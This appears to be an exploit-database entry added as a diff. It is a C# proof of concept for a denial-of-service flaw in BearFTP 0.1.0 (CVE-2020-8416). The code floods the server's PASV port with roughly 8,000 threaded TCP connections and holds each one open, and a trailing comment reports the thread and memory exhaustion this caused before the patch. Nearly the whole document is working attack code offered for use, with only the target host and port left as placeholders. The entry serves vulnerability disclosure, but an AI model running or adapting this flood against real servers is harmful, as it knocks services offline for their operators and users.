@@ -1,0 +1,43 @@
+# Exploit Title: BearFTP 0.1.0 - 'PASV' Denial of Service
+# Date: 2020-01-29
+# Exploit Author: kolya5544
+# Vendor Homepage: http://iktm.me/
+# Software Link: https://github.com/kolya5544/BearFTP/releases
+# Version: v0.0.1 - v0.1.0
+# Tested on: Ubuntu 18.04
+# CVE : CVE-2020-8416
+
+static void Main(string[] args)
+        {
+            Console.WriteLine("DoS started. Approx. time to complete: 204 seconds.");
+            for (int i = 0; i < 1024*8; i++) // We will do 8000+ connections. Usually server only spawns half of them.
+            {
+                new Thread(() =>
+                {
+                    Thread.CurrentThread.IsBackground = true;
+
+                    TcpClient exploit = new TcpClient("HOSTNAME", PASV_PORT); //Replace with actual data to test it.
+                    var ns = exploit.GetStream();
+                    StreamWriter sw = new StreamWriter(ns);
+                    sw.AutoFlush = true;
+                    StreamReader sr = new StreamReader(ns);
+
+
+                    while (true)
+                    {
+                        Thread.Sleep(5000); //We just spend our time.
+                    }
+                }).Start();
+                Thread.Sleep(25); //Spawn a new connection every 25ms so we don't kill our own connection.
+            }
+            while (true)
+            {
+                Console.WriteLine("DoS attack completed!");
+                Thread.Sleep(20000);
+            }
+        }
+/*
+BEFORE PATCH APPLIED (after ~100 seconds of attacking):
+3700 threads spawned, VIRT went from 3388M to 32.1G, RES from 60000 to 129M. CPU usage ~10%. The server struggles to process commands. Recovers in several minutes after the attack is stopped
+AFTER PATCH APPLIED:
+10 threads spawned at most, VIRT didnt change, RES didnt change. CPU usage ~3%. Works fine. */
